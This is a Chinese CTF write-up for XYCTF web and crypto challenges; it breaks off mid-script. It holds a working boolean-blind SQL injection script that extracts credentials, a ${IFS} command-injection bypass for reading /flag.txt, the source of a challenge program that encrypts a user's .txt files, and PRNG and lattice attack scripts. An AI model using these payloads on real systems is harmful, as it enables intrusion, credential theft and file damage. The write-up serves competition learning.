跳转到 doublecheck.php，搞了一下发现也妹得注入用 bp 看了一下，跳转之前 login.php 是有响应的，可以使用布尔盲注，注意到逗号也被过滤了，使用 substr(xxx from x for y) 代替 substr(xxx, x, y)，脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requests as rurl = 'http://eci-2ze3h973qy7uqodho0gc.cloudeci1.ichunqiu.com/login.php'value = ''i = 1while True: low, high = 0, 127 char_ascii = 0 while low &lt;= high: mid = (low + high) // 2 # payload = f&quot;' OR ascii(substr(database() from {i} for {i})) &gt; {mid}#&quot; # testdb # payload = f&quot;' OR ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='testdb') from {i} for {i})) &gt; {mid}#&quot; # double_check,user # payload = f&quot;' OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='double_check') from {i} for {i})) &gt; {mid}#&quot; # secret # payload = f&quot;' OR ascii(substr((select group_concat(secret) from double_check) from {i} for {i})) &gt; {mid}#&quot; # dtfrtkcc0czkoua9S # payload = f&quot;' OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user') from {i} for {i})) &gt; {mid}#&quot; # username,password # payload = f&quot;' OR ascii(substr((select group_concat(username) from user) from {i} for {i})) &gt; {mid}#&quot; # yudeyoushang payload = f&quot;' OR ascii(substr((select group_concat(password) from user) from {i} for {i})) &gt; {mid}#&quot; # zhonghengyisheng data = { 'username': payload.replace(&quot; &quot;, &quot;\\t&quot;), 'password': '1' } result = r.post(url, data=data, allow_redirects=False) oracle = not &quot;帐号或密码错误&quot; in result.text if oracle: low = mid + 1 else: high = mid - 1 if high &lt; 0: break char_ascii = high + 1 if char_ascii == 0: break value += chr(char_ascii) print(f&quot;Current: {value}&quot;) i += 1print(f&quot;Final value: {value}&quot;) 一点点把东西全注出来，然后用拿到的帐号密码还有 secret 直接登录，进入一个命令执行的页面，无回显，测试了一下存在空格过滤，于是用 ${IFS} 作为空格绕过，试了一下 sleep${IFS}2，发现响应明显变慢了，说明可以执行，执行 ls${IFS}/${IFS}&gt;${IFS}flag.txt，看到 flag.txt 了，直接 cp${IFS}/flag.txt${IFS}flag.txt，再访问 /flag.txt 即可。 puzzle打开是一个拼图网页，刷新几次发现并不能随机到初始即正确的情况，按 F12 发现被拦截，在 bp 看到逻辑是在 index.html 里的 JS 加入了对 contextmenu 和 keydown 的监听，同时发现网页引用了 /js/puzzle.js。那么我们直接访问 /js/puzzle.js，即可绕过拦截打开控制台。然后一看，我嘞个一大坨 JS 啊，直接把代码丢给 DeepSeek，花了几毛钱直接判断出变量 ogde564hc3f4 控制是否完成，本地修改一下 ogde564hc3f4 的值为 true，然后在 2 秒内随便点一下就出 flag 了：flag{Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!} Crypto勒索病毒给了一个 task.exe 和 flag.txt.enc，用 IDA 一看都是 modules 之流，用 python-exe-unpacker 解包，得到的 task 文件就是 task.sage，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207# @author: Crypto0import reimport base64import osimport sysfrom gmssl import sm4from Crypto.Util.Padding import padimport binasciifrom random import shuffle, randrangeN = 49 p = 3q = 128 d = 3assert q &gt; (6 * d + 1) * pR.&lt;x&gt; = ZZ[]def generate_T(d1, d2): assert N &gt;= d1 + d2 s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2) shuffle(s) return R(s)def invert_mod_prime(f, p): Rp = R.change_ring(Integers(p)).quotient(x^N - 1) return R(lift(1 / Rp(f)))def convolution(f, g): return (f * g) % (x^N - 1)def lift_mod(f, q): return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])def poly_mod(f, q): return R([f[i] % q for i in range(N)])def invert_mod_pow2(f, q): assert q.is_power_of(2) g = invert_mod_prime(f, 2) while True: r = lift_mod(convolution(g, f), q) if r == 1: return g g = lift_mod(convolution(g, 2 - r), q)def generate_message(): return R([randrange(p) - 1 for _ in range(N)])def generate_key(): while True: try: f = generate_T(d + 1, d) g = generate_T(d, d) Fp = poly_mod(invert_mod_prime(f, p), p) Fq = poly_mod(invert_mod_pow2(f, q), q) break except: continue h = poly_mod(convolution(Fq, g), q) return h, (f, g)def encrypt_message(m, h): e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q) return edef save_ntru_keys(): h, secret = generate_key() with open(&quot;pub_key.txt&quot;, &quot;w&quot;) as f: f.write(str(h)) m = generate_message() with open(&quot;priv_key.txt&quot;, &quot;w&quot;) as f: f.write(str(m)) e = encrypt_message(m, h) with open(&quot;enc.txt&quot;, &quot;w&quot;) as f: f.write(str(e))def terms(poly_str): terms = [] pattern = r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)' matches = re.finditer(pattern, poly_str.replace(' ', '')) for match in matches: term = match.group() if term == '+x' or term == 'x': terms.append(1) elif term == '-x': terms.append(-1) elif 'x^' in term: coeff_part = term.split('x^')[0] exponent = int(term.split('x^')[1]) if not coeff_part or coeff_part == '+': coeff = 1 elif coeff_part == '-': coeff = -1 else: coeff = int(coeff_part) terms.append(coeff * exponent) elif 'x' in term: coeff_part = term.split('x')[0] if not coeff_part or coeff_part == '+': terms.append(1) elif coeff_part == '-': terms.append(-1) else: terms.append(int(coeff_part)) else: if term == '+1' or term == '1': terms.append(0) terms.append(-0) return termsdef gen_key(poly_terms): binary = [0] * 128 for term in poly_terms: exponent = abs(term) if term &gt; 0 and exponent &lt;= 127: binary[127 - exponent] = 1 binary_str = ''.join(map(str, binary)) hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32) return hex_keydef read_polynomial_from_file(filename): with open(filename, 'r') as file: return file.read().strip()def sm4_encrypt(key, plaintext): assert len(key) == 16, &quot;SM4 key must be 16 bytes&quot; cipher = sm4.CryptSM4() cipher.set_key(key, sm4.SM4_ENCRYPT) padded_plaintext = pad(plaintext, 16) return cipher.crypt_ecb(padded_plaintext)def sm4_encrypt_file(input_path, output_path, key): with open(input_path, 'rb') as f: plaintext = f.read() ciphertext = sm4_encrypt(key, plaintext) with open(output_path, 'wb') as f: f.write(ciphertext)def resource_path(relative_path): if getattr(sys, 'frozen', False): base_path = sys._MEIPASS else: base_path = os.path.abspath(&quot;.&quot;) return os.path.join(base_path, relative_path)def encrypt_directory(directory, sm4_key, extensions=[&quot;.txt&quot;]): if not os.path.exists(directory): print(f&quot;Directory does not exist: {directory}&quot;) return for root, _, files in os.walk(directory): for file in files: if any(file.endswith(ext) for ext in extensions): input_path = os.path.join(root, file) output_path = input_path + &quot;.enc&quot; try: sm4_encrypt_file(input_path, output_path, sm4_key) os.remove(input_path) print(f&quot;Encrypted: {input_path} -&gt; {output_path}&quot;) except Exception as e: print(f&quot;Error encrypting {input_path}: {str(e)}&quot;)def main(): try: save_ntru_keys() poly_str = read_polynomial_from_file(&quot;priv_key.txt&quot;) poly_terms = terms(poly_str) sm4_key = binascii.unhexlify(poly_terms) user_name = os.getlogin() target_dir = os.path.join(&quot;C:\\Users&quot;, user_name, &quot;Desktop&quot;, &quot;test_files&quot;) if not os.path.exists(target_dir): os.makedirs(target_dir, exist_ok=True) print(f&quot;Created directory: {target_dir}&quot;) return txt_files = [f for f in os.listdir(target_dir) if f.endswith('.txt') and os.path.isfile(os.path.join(target_dir, f))] if not txt_files: print(&quot;No .txt files found in directory&quot;) return for txt_file in txt_files: file_path = os.path.join(target_dir, txt_file) try: with open(file_path, 'rb') as f: test_data = f.read() ciphertext = sm4_encrypt(sm4_key, test_data) encrypted_path = file_path + '.enc' with open(encrypted_path, 'wb') as f: f.write(ciphertext) except Exception as e: print(f&quot;Error processing {txt_file}: {str(e)}&quot;) except Exception as e: print(f&quot;Fatal error: {str(e)}&quot;)if __name__ == &quot;__main__&quot;: main() 但是按理说这个应该是不能跑的，不知道是不是我解包有问题，poly_terms = terms(poly_str) 得到的是一个 list，按理说 binascii.unhexlify() 是不能传的，应该是少了个 gen_key() 的处理。 题目总体逻辑比较简单，但是命名非常混乱，priv_key.txt 并不是私钥，而是一个随机的多项式，然后这个多项式被 NTRU 加密了，注意到解包出来的还有公钥 pub_key.txt，和加密后的多项式 enc.txt。用轮子搞个私钥出来： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from Crypto.Util.number import *import timestart = time.time()Zx.&lt;x&gt; = ZZ[]n = 49q = 128p = 3h = 8*x^48 + 58*x^47 + 18*x^46 + 61*x^45 + 33*x^44 + 21*x^43 + 58*x^42 + 21*x^41 + 5*x^40 + 32*x^39 + 15*x^38 + 40*x^37 + 24*x^36 + 14*x^35 + 40*x^34 + 5*x^33 + x^32 + 48*x^31 + 21*x^30 + 36*x^29 + 42*x^28 + 8*x^27 + 17*x^26 + 54*x^25 + 39*x^24 + 38*x^23 + 14*x^22 + 22*x^21 + 26*x^20 + 22*x^18 + 7*x^17 + 29*x^16 + 53*x^15 + 50*x^14 + 49*x^13 + 21*x^12 + 47*x^11 + 50*x^10 + 32*x^9 + 14*x^8 + 50*x^7 + 18*x^6 + 9*x^5 + 61*x^4 + 10*x^3 + 9*x^2 + 11*x + 47e = 31*x^48 - 14*x^47 + x^46 + 8*x^45 - 9*x^44 - 18*x^43 - 30*x^41 + 14*x^40 + 3*x^39 - 17*x^38 + 22*x^37 + 7*x^36 + 31*x^34 - 30*x^33 - 22*x^32 - 25*x^31 + 31*x^30 - 28*x^29 + 7*x^28 + 23*x^27 - 6*x^26 + 12*x^25 - 6*x^24 + 5*x^23 - 13*x^22 - 10*x^20 + 4*x^19 + 15*x^18 + 23*x^17 + 24*x^16 - 2*x^15 - 8*x^14 - 20*x^13 + 24*x^12 - 23*x^11 - 4*x^10 - 26*x^9 - 14*x^8 + 10*x^7 + 4*x^6 - 4*x^5 - 32*x^4 - 5*x^3 - 31*x^2 + 16*x + 11-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1def mul(f,g): return (f * g) % (x^n-1)def decrypt(pri_key,e): f,fp = pri_key a = bal_mod(mul(f,e),q) b = bal_mod(mul(a,fp),p) print(b) pt = ''.join([str(i) for i in b.list()]) return ptdef bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g)def lattice(h,q): n = 49 # h = bal_mod(683*h,q) grid = Matrix(ZZ,2*n,2*n) cof = h.list() offset = 0 for i in range(2*n): for j in range(2*n): if i&lt;n: if j &lt; n: if i==j: grid[i,j] = 1 else: grid[i,j] = cof[(j-n-offset)%n] elif j&gt;=n and i==j: grid[i,j] = q offset += 1 GL = grid.BKZ() return GL,griddef inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f)))GL,grid = lattice(h,q)SVP = list(GL[0])f = Zx(SVP[:n])g = Zx(SVP[-n:])a = bal_mod(mul(f,e),q)fp = inv_mod_prime(f,p)pv = (f,fp)decrypt(pv,e) 然后存到 priv_key.txt 里，把 main() 函数改成 12345678910poly_str = read_polynomial_from_file(&quot;priv_key_1.txt&quot;)poly_terms = terms(poly_str)print(f&quot;Polynomial Terms: {poly_terms}&quot;)key = gen_key(poly_terms)sm4_key = binascii.unhexlify(key)print(f&quot;SM4 Key: {sm4_key.hex()}&quot;)enc = &quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;enc = bytes.fromhex(enc)dec = sm4_decrypt(sm4_key, enc)print(f&quot;Decrypted: {dec}&quot;) 得到 flag：XYCTF{Crypto0_can_n0t_So1ve_it} Division12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- encoding: utf-8 -*-'''@File : server.py@Time : 2025/03/20 12:25:03@Author : LamentXU '''import random print('----Welcome to my division calc----')print('''menu: [1] Division calc [2] Get flag''')while True: choose = input(': &gt;&gt;&gt; ') if choose == '1': try: denominator = int(input('input the denominator: &gt;&gt;&gt; ')) except: print('INPUT NUMBERS') continue nominator = random.getrandbits(32) if denominator == '0': print('NO YOU DONT') continue else: print(f'{nominator}//{denominator} = {nominator//denominator}') elif choose == '2': try: ans = input('input the answer: &gt;&gt;&gt; ') rand1 = random.getrandbits(11000) rand2 = random.getrandbits(10000) correct_ans = rand1 // rand2 if correct_ans == int(ans): print('WOW') with open('flag', 'r') as f: print(f'Here is your flag: {f.read()}') else: print(f'NOPE, the correct answer is {correct_ans}') except: print('INPUT NUMBERS') else: print('Invalid choice') MT19937 小练习，上轮子梭 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *# context.log_level = 'debug'from tqdm import trangeimport syssys.path.append('./MT19937-Symbolic-Execution-and-Solver-master/source')from MT19937 import MT19937# r = process([&quot;python3&quot;, &quot;server.py&quot;])r = remote(&quot;47.94.172.18&quot;, 36871)data = []for _ in trange(624): r.recvuntil(b'&gt;&gt;&gt; ') r.sendline(b'1') r.recvuntil(b'&gt;&gt;&gt; ') r.sendline(b'1') r.recvuntil(b'= ') data.append(int(r.recvline().strip()))print(len(data))rng = MT19937(state_from_data = (data, 32))# for _ in range(624):# rng()recover = [rng() for _ in range(624)]assert recover == data, f&quot;Recover failed: {recover} != {data}&quot;def getrandbits(n): num = 0 for i in range(n//32): num = (rng() &lt;&lt; (32 * i)) | num num = rng() &gt;&gt; (32 - (n % 32)) &lt;&lt; n//32*32 | num return numrand1 = getrandbits(11000)rand2 = getrandbits(10000)correct_ans = rand1 // rand2r.recvuntil(b'&gt;&gt;&gt; ')r.sendline(b'2')r.recvuntil(b'&gt;&gt;&gt; ')r.sendline(str(correct_ans).encode())r.interactive() reed呃，丢给 DeepSeek 就行了，只要存在 a 就能解出来，根本不用管 PRNG 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import stringfrom math import gcdfrom pwn import *r = remote('47.94.217.82', 26633)table = string.ascii_letters + string.digitsm = 19198111def decrypt(enc): res = [] n = len(table) # 尝试不同的字符对位置 positions = [(i, i+1) for i in range(35)] for pos1, pos2 in positions: if pos1 &gt;= len(enc) or pos2 &gt;= len(enc): continue # 避免越界 c0, c1 = enc[pos1], enc[pos2] # 遍历所有可能的明文字符对 for i in range(n): p0 = i for j in range(n): if i == j: continue # 跳过相同字符对 p1 = j delta_p = p1 - p0 try: inv_delta_p = pow(delta_p, -1, m) except ValueError: continue # 无逆元则跳过（理论上不会发生） a = ((c1 - c0) * inv_delta_p) % m if gcd(a, m) != 1: continue # a 必须与模数互质 inv_a = pow(a, -1, m) b = (c0 - a * p0) % m # 验证所有密文字符 valid = True plain = [] for c in enc: p = ((c - b) * inv_a) % m if not (0 &lt;= p &lt; n): valid = False break plain.append(table[p]) if valid: res.append(''.join(plain)) return res # 未找到解# 示例密文（需替换为实际输出）r.recvuntil(b'give me seed: ')r.sendline(b'0')enc = eval(r.recvline().strip())print(len(enc), enc)flag = decrypt(enc)print(set(flag))# XYCTF{114514fixedpointissodangerous1919810} 会跑出不同结果，肉眼筛选一下即可。 Complex_signinCoppersmith 小练习，直接把式子拆出来，然后套上多元轮子即可 123456789101112131415161718192021222324from sage.all import *from coppersmith import small_rootsfrom Crypto.Cipher import ChaCha20import hashlibbits = 128n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]enc = b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe'P = PolynomialRing(Zmod(n), names='x, y')x, y = P.gens()mh_re, mh_im = mhf = -3*mh_im**2*mh_re + mh_re**3 - 3*mh_im**2*x + 3*mh_re**2*x + 3*mh_re*x**2 + x**3 - 6*mh_im*mh_re*y - 6*mh_im*x*y - 3*mh_re*y**2 - 3*x*y**2 - C[0]roots = small_roots(f, (2**bits, 2**bits), 2, 3)# print(roots)m_re = mh_re + int(roots[0][0])m_im = mh_im + int(roots[0][1])flag = ChaCha20.new(key=hashlib.sha256(str(m_re + m_im).encode()).digest(), nonce=b'Pr3d1ctmyxjj').decrypt(enc)print(flag.decode())# XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge} prng_xxxx我就说这个问题肯定有人想过的，搜到这篇文章 我大概翻译一下，问题形式如下： $$X_{i+1} = (AX_i + C) \\mod 2^{n} \\\\Y_i = (X_i/2^{n/2}) \\oplus (X_i\\mod 2^{n/2})$$ 解法：Step 1先找到 $|w_i|&lt;W$ 使得 $$\\sum_{i=1}^{m} w_i A^i \\equiv 0 \\pmod{2^{n/2+k}}$$ 这里可以用一个如下形式的格做 LLL 求解： $$\\begin{pmatrix}1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; KA \\\\0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; KA^2 \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; KA^m \\\\0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; K\\cdot 2^{n/2+k} \\\\\\end{pmatrix}$$ 其中 $K$ 取适合大的值。 Step 2然后猜 $X_0$ 的低 $k$ 位，若 C 未知，同步猜测 $C$ 的低 $k$ 位，依据这俩把整个 $X_i$ 推出来。 Step 3此时可以理解成 $X_0$ 和 $C$ 的低 $k$ 位已知，用 $Y_i$ 把 $X_i$ 左半部分的低 $k$ 位也还原出来（这里没看懂的的去看鸡块哥的文章），把这些位记为 $X_i^*$，即有 $X_i^* = 2^{n/2} \\times \\mathrm{guess}$ Step 4推出下面的式子： $$\\sum_{i=1}^{m} w_i [X_{i+1} - X_i] \\equiv 0 \\pmod{2^{n/2+k}}$$ Step 5计算$$Z = \\sum_{i=1}^{m} w_i [X_{i+1}^* - X_i^*] \\pmod{2^{n/2+k}}$$记 $\\Delta$ 为 $Z$ 与 0 或 $2^{n/2+k}$ 的差值（选最小的一个） Step 6若 $\\Delta \\ge 2mW\\cdot 2^{n/2}$，那对于 $X_i$ 的低 $k$ 位的猜测肯定是错的，否则就有 $1-2mW\\cdot 2^{-k}$ 的概率是对的。 Step 7对不同的 $Y_i$ 尝试所有 $2^k$ 的猜测，直接只剩下最后一个猜测，就是 $X_0$ 的低 $k$ 位。 Step 8重复以上步骤，直到 $X_0$ 的所有位都被还原。 $k$ 应该比 $\\log_2mW$ 大很多，不然 step 6 的判定就很难起作用。 按以上的方法搞一搞，最终 flag 为 XYCTF{0h_3v3n_X0R_c@n't_s@v3_LCG!} 代码一坨屎就先不放了，就注意一下 step 7 的意思是不用选全部的 output，比如第一轮用 $Y_0$ 到 $Y_{31}$，第二轮用 $Y_1$ 到 $Y_{32}$，第三轮用 $Y_2$ 到 $Y_{33}$，依次类推，而且实际上也不会只剩下一个，会剩下 4 至 16 个左右。 改好了，端上巧克力味的史，为了方便读者理解整个流程，没有做太多的简化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179from sage.all import *from tqdm import trangefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadfrom hashlib import md5class LCG: def __init__(self, seed, a, b): self.seed = seed self.a = a self.b = b self.m = 2**128 def next(self): self.seed = (self.seed * self.a + self.b) % self.m return (self.seed &gt;&gt; 64) ^ (self.seed % 2**64)class lfsr: # 我被裁了/(ㄒoㄒ)/~~ passa = 47026247687942121848144207491837523525output = [17861431650111939539, 15632044669542972472, 18085804805519111109, 11630394250634164303, 10914687109985225138, 7348450425255618214, 10796029302647050328, 14267824433700366397, 9363967587530173835, 8995382728269798714, 3504283765121786984, 1312349325731613524, 10716889342831891752, 12298317818779713512, 8701992888199838445, 7261196699430834071, 4670657923849978944, 9833942603152121381, 18304734854303383637, 15945503654626665549, 6509330987395005461, 223169047706410182, 12990946817252956584, 3884858487227858459, 6366350447244638553, 10326924732676590049, 12989931141522347344, 9197940263960765675, 2481604167192102429, 1409946688030505107, 9263229900540161832, 266892958530212020, 14298569012977896930, 17318088100106133211, 4224045753426648494, 650161332435727275, 9488449142549049042, 8916910451165068139, 10116136382602356010, 6604992256480748513, 7375827593997920567, 1661095751967623288, 4143230452547340203, 4145435984742575053, 10465207027576409947, 16146447204594626029, 2807803679403346199, 10857432394281592897, 1494771564147200381, 2085795265418108023, 11756240132299985418, 13802520243518071455, 1191829597542202169, 16603089856395516862, 12517247819572559598, 14148806699104849454, 8174845389550768121, 15565523852832475714, 10046639095828632930, 15353735627107824646, 7003433641698461961, 11217699328913391211, 6392630836483027655, 7918524192972397836]n = 128m = 32k = 9WW = 2step = 9print(k, int(log(m*WW, 2)))def get_w(n, m, k, WW, A): M = matrix(ZZ, m+1, m+1) K = 2**200 for i in range(m): M[i, i] = 1 M[i, m] = K*a**(i+1) M[m, m] = K*2**(n//2+k) for w in M.BKZ(): w = w[:-1] lhs = sum([w[i]*A**(i+1) for i in range(m)]) % 2**(n//2+k) if max(list(map(abs, w))) == WW and lhs == 0: print(&quot;Found w successfully&quot;) return w raise ValueError(&quot;No suitable w found&quot;)# w = get_w(n, m, k, WW, a)# known_lsb9 = None# for windows in trange(0, 64-m):# candidate = []# for guessX0 in range(2**step):# for guessB in range(2**step):# X = [guessX0]# for _ in range(1, 64+1):# X.append((X[-1]*a + guessB) % 2**k)# X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)]# Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k)# delta = min(Z, abs(Z-2**(n//2+k)))# if delta &lt; 2*m*WW*2**(n//2):# candidate.append((X[0], guessB))# if known_lsb9 is None:# known_lsb9 = list(set(candidate))# else:# known_lsb9 = list(set(known_lsb9) &amp; set(candidate))# print(len(known_lsb9))# if len(known_lsb9) == 16: # after observing, we found 16 is the minimum, even not 16 is small enough# break# print(known_lsb9)known_lsb9 = [(53, 69), (458, 255), (201, 67), (310, 1), (54, 257), (202, 255), (310, 257), (309, 325), (54, 1), (53, 325), (457, 67), (458, 511), (201, 323), (202, 511), (457, 323), (309, 69)]known_lsb16 = []m = 32k = 16WW = 3step = 7w = get_w(n, m, k, WW, a)for X0low, Blow in known_lsb9: tmp = None for windows in trange(0, 64-m): candidate = [] for guessX0 in range(2**step): for guessB in range(2**step): X = [guessX0*2**9 + X0low] guessB = guessB * 2**9 + Blow for _ in range(1, 64+1): X.append((X[-1]*a + guessB) % 2**k) X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)] Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k) delta = min(Z, abs(Z-2**(n//2+k))) if delta &lt; 2*m*WW*2**(n//2): candidate.append((X[0], guessB)) if tmp is None: tmp = list(set(candidate)) else: tmp = list(set(tmp) &amp; set(candidate)) # print(len(tmp)) if len(tmp) == 0 or len(tmp) == 4: # 4 groups is the best situation break known_lsb16 += tmpprint(known_lsb16)def known_lsbx2knownlsbk(known_lsbx, m, k, WW, step=4): w = get_w(n, m, k, WW, a) known_lsbk = [] for X0low, Blow in known_lsbx: tmp = None for windows in range(0, 64-m): candidate = [] for guessX0 in range(2**step): for guessB in range(2**step): X = [guessX0*2**(k-step) + X0low] guessB = guessB * 2**(k-step) + Blow for _ in range(1, 64+1): X.append((X[-1]*a + guessB) % 2**k) X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)] Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k) delta = min(Z, abs(Z-2**(n//2+k))) if delta &lt; 2*m*WW*2**(n//2): candidate.append((X[0], guessB)) if tmp is None: tmp = list(set(candidate)) else: tmp = list(set(tmp) &amp; set(candidate)) # print(len(tmp)) if len(tmp) == 0 or len(tmp) == 4: # 4 groups is the best situation break known_lsbk += tmp return known_lsbk# known_lsb16 = [(14949, 29941), (47717, 62709), (14949, 62709), (47717, 29941), (50586, 335), (17818, 33103), (17818, 335), (50586, 33103), (47718, 32433), (14950, 32433), (14950, 65201), (47718, 65201), (50585, 63379), (17817, 30611), (50585, 30611), (17817, 63379)]known_lsb20 = known_lsbx2knownlsbk(known_lsb16, 48, 20, 2) # For a fix k, adjust m and WW until it worksprint(len(known_lsb20))known_lsb24 = known_lsbx2knownlsbk(known_lsb20, 32, 24, 3)print(len(known_lsb24))known_lsb28 = known_lsbx2knownlsbk(known_lsb24, 40, 28, 3)print(len(known_lsb28))known_lsb32 = known_lsbx2knownlsbk(known_lsb28, 40, 32, 4)print(len(known_lsb32))known_lsb36 = known_lsbx2knownlsbk(known_lsb32, 40, 36, 4)print(len(known_lsb36))known_lsb40 = known_lsbx2knownlsbk(known_lsb36, 40, 40, 4)print(len(known_lsb40))known_lsb44 = known_lsbx2knownlsbk(known_lsb40, 40, 44, 4)print(len(known_lsb44))known_lsb48 = known_lsbx2knownlsbk(known_lsb44, 40, 48, 4)print(len(known_lsb48))known_lsb52 = known_lsbx2knownlsbk(known_lsb48, 40, 52, 4)print(len(known_lsb52))known_lsb56 = known_lsbx2knownlsbk(known_lsb52, 40, 56, 5)print(len(known_lsb56))known_lsb60 = known_lsbx2knownlsbk(known_lsb56, 40, 60, 5)print(len(known_lsb60))known_lsb64 = known_lsbx2knownlsbk(known_lsb60, 40, 64, 5)print(len(known_lsb64))print(known_lsb64)enc = b'l\\x8bd,\\xa3\\xe7\\x87*\\xca\\n\\xd7\\x11\\xd6n=\\xeaS`\\xa4w\\x94(\\xb9\\xf9\\xb9\\xc6\\xe3\\xc2\\xfb\\xdb\\x80\\xf6\\x9f\\xc7\\xd1F&quot;`{;V\\xa7}Z\\xc0\\xc0\\xf6&lt;'for seed, b_low in known_lsb64: X0_low = seed X0_high = (seed ^ output[0]) % 2**64 X0 = (X0_high &lt;&lt; 64) | X0_low X1_low = (a*X0 + b_low) % 2**64 X1_high = (X1_low ^ output[1]) % 2**64 X1 = (X1_high &lt;&lt; 64) | X1_low b = (X1 - a*X0) % 2**128 seed = (X0 - b)*pow(a, -1, 2**128) % 2**128 lcg = LCG(seed, a, b) if [lcg.next() for _ in [0] * 64] == output: try: flag = AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).decrypt(enc) print(unpad(flag, 16).decode()) except: pass choice又是 MT19937 小练习，复用 Division 的代码就行了 123456789101112131415161718192021222324import syssys.path.append('../Division/MT19937-Symbolic-Execution-and-Solver-master/source')from Crypto.Util.number import *from MT19937 import MT19937from output import r, encr = [255-i for i in r]rng = MT19937(state_from_data = (r, 8))def getrandbits(n): num = 0 for i in range(n//32): num = (rng() &lt;&lt; (32 * i)) | num num = rng() &gt;&gt; (32 - (n % 32)) &lt;&lt; n//32*32 | num return numrng.reverse_states(enc.bit_length()//32+1)randnum = getrandbits(175) # 密文是 172 位，由于第一个字符一定是 0xxx xxxx，所以多取 